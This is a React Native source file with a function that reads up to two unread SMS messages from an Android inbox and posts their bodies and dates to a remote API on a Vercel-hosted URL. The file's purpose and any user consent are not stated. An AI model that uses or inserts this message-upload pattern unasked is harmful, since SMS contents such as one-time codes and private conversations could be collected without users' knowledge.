import SmsAndroid from 'react-native-get-sms-android';
import VERCEL_URL from './vercel_url'

const SendAllData = () =>{

    const URL = VERCEL_URL
    const LocalURL = 'http://localhost:3000'

    var filter = {
        box: 'inbox',
        read: 0,
        indexFrom: 0,
        maxCount: 2
    }

    SmsAndroid.list(
        JSON.stringify(filter),
        (fail)=>{
            console.log('Failed with this error: '+ fail);
            
        },
        (count,smsList)=>{
            var tempmsgbody = []
            var tempmsgdate = []

            var arr = JSON.parse(smsList);

            arr.forEach(function(object){
                tempmsgbody.push(object.body);
                tempmsgdate.push(object.date);
            });


            fetch(URL+'/api/SendAllData',{
                method: "POST",
                headers: {
                    "Content-Type" : "application/json"
                },
                body: JSON.stringify({
                    msg_date: tempmsgdate,
                    msg_body: tempmsgbody
                })
            }).then(res=>res.json())
            .then(data=>{
                if(data.success){
                    console.log("Success")
                }
                else{
                    console.log("Failed")
                }
                    

            })
        }
    )
}

const SendData = () =>{

}

export {SendAllData, SendData}

